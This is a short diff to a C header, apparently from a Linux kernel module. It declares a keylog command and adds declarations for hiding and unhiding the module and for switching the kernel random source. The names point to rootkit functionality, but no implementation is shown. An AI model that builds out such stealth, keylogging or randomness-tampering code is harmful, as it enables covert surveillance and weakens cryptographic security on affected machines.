@@ -28,6 +28,15 @@ void cat_command(args_t* args);
 
 void keylog_command(args_t* args);
 
+bool hide_module(void);
+
+bool unhide_module(void);
+
+extern struct mutex random_mutex; 
+
+extern bool random_switched;
+
+bool switch_random(void);
 
 
 #endif
